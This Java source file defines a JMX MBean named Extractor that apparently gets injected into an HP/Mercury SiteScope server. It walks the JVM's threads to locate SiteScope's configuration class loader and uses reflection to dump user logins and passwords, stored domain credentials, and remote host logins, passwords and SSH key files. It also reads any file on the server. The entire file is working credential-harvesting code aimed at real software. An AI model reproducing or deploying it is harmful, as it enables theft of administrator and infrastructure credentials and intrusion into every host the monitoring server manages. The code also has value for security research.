/*
 * Copyright (C) 2017 hantwister
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package scat.mbean;

import java.lang.reflect.Method;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Collection;
import java.util.HashSet;
import java.util.List;
import scat.pojo.Credential;
import scat.pojo.Host;
import scat.pojo.SiteScopeUser;

/**
 *
 * @author hantwister
 */
public class Extractor implements ExtractorMBean {

    public static final String OBJECT_NAME = "SCAT1:name=SCAT1,id=A1B2C3D4";

    private final ClassLoader configCl;

    private final Class cms_c, im_c, m_c;

    private final Method fro_m;

    public Extractor() throws Throwable {
        // Iterate threads to find the class loader where com.mercury.sitescope.platform.configmanager.* is loaded
        // Get the root thread group
        ThreadGroup group = Thread.currentThread().getThreadGroup();
        while (group.getParent() != null) {
            group = group.getParent();
        }

        // Get a list of (possibly almost) all threads
        Thread[] threads = new Thread[group.activeCount()];
        group.enumerate(threads);

        // Iterate the threads
        for (Thread thread : threads) {
            if (thread == null) {
                continue;
            }

            ClassLoader cl = thread.getContextClassLoader();

            // Check the class loader for this thread
            try {
                cl.loadClass("com.mercury.sitescope.platform.configmanager.ConfigManagerSession");
            } catch (Throwable t) {
                continue;
            }

            // If we reach this point, we've found the right class loader
            configCl = cl;

            cms_c = configCl.loadClass("com.mercury.sitescope.platform.configmanager.ConfigManagerSession");
            im_c = configCl.loadClass("com.mercury.sitescope.platform.configmanager.interfaces.IMatcher");
            m_c = configCl.loadClass("com.mercury.sitescope.platform.configmanager.matchers.Matchers");

            fro_m = cms_c.getMethod("filterReadOnly", im_c);

            return;
        }

        // If we reach this point, no threads had the class loader we wanted
        throw new IllegalStateException();
    }

    private Collection getManagedObjectConfigs(String matcher) throws Throwable {
        // Get the ${matcher} field from the Matchers class
        Object filterArg = m_c.getField(matcher).get(null);

        // Run ConfigManagerSession.filterReadOnly(Matchers.${matcher})
        return (Collection) fro_m.invoke(null, filterArg);
    }

    private String getManagedObjectProperty(Object mo, String property) throws Throwable {
        return (String) mo.getClass().getMethod("get" + property).invoke(mo);
    }

    private String getManagedObjectCustomProperty(Object mo, String property) throws Throwable {
        return (String) mo.getClass().getMethod("getProperty", String.class).invoke(mo, property);
    }

    @Override
    public Collection<SiteScopeUser> getSiteScopeUsers() throws Throwable {
        HashSet<SiteScopeUser> toReturn = new HashSet<>();

        for (Object moc : getManagedObjectConfigs("ALL_USERS")) {
            SiteScopeUser ssu = new SiteScopeUser();
            ssu.setUsername(getManagedObjectProperty(moc, "Login"));
            ssu.setPassword(getManagedObjectProperty(moc, "Password"));
            toReturn.add(ssu);
        }

        return toReturn;
    }

    @Override
    public Collection<Credential> getCredentials() throws Throwable {
        HashSet<Credential> toReturn = new HashSet<>();

        for (Object moc : getManagedObjectConfigs("ALL_CREDENTIALS_ENTITIES")) {
            Credential c = new Credential();
            c.setDomain(getManagedObjectProperty(moc, "Domain"));
            c.setUsername(getManagedObjectProperty(moc, "Login"));
            c.setPassword(getManagedObjectProperty(moc, "Password"));
            toReturn.add(c);
        }

        return toReturn;
    }

    @Override
    public Collection<Host> getHosts() throws Throwable {
        HashSet<Host> toReturn = new HashSet<>();

        for (Object moc : getManagedObjectConfigs("ALL_REMOTES")) {
            Host h = new Host();
            h.setHost(getManagedObjectCustomProperty(moc, "_host"));
            h.setLogin(getManagedObjectCustomProperty(moc, "_login"));
            h.setMethod(getManagedObjectCustomProperty(moc, "_method"));
            h.setOs(getManagedObjectCustomProperty(moc, "_os"));
            h.setPassword(getManagedObjectCustomProperty(moc, "_password"));
            h.setSshAuthMethod(getManagedObjectCustomProperty(moc, "_sshAuthMethod"));
            h.setSshKeyFile(getManagedObjectCustomProperty(moc, "_keyFile"));
            h.setSshPort(getManagedObjectCustomProperty(moc, "_sshPort"));
            toReturn.add(h);
        }

        return toReturn;
    }

    @Override
    public List<String> getFile(String filename) throws Throwable {
        return Files.readAllLines(Paths.get(filename), Charset.defaultCharset());
    }

}
